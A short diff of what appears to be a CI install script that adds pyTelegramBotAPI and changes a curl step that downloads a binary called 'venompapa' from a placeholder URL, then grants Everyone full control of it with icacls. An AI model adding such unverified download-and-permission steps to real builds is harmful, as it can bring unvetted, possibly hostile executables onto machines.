@@ -16,7 +16,7 @@ install:
   - pip install pyTelegramBotAPI
   
   # Ensure binary exists (if not, download it)
-  - if not exist venompapa.exe curl -L -o venompapa.exe https://example.com/path/to/venompapa.exe
+  - if not exist venompapa curl -L -o venompapa https://example.com/path/to/venompapa
 
   # Set executable permissions for the binary (for Windows)
   - icacls venompapa /grant Everyone:F
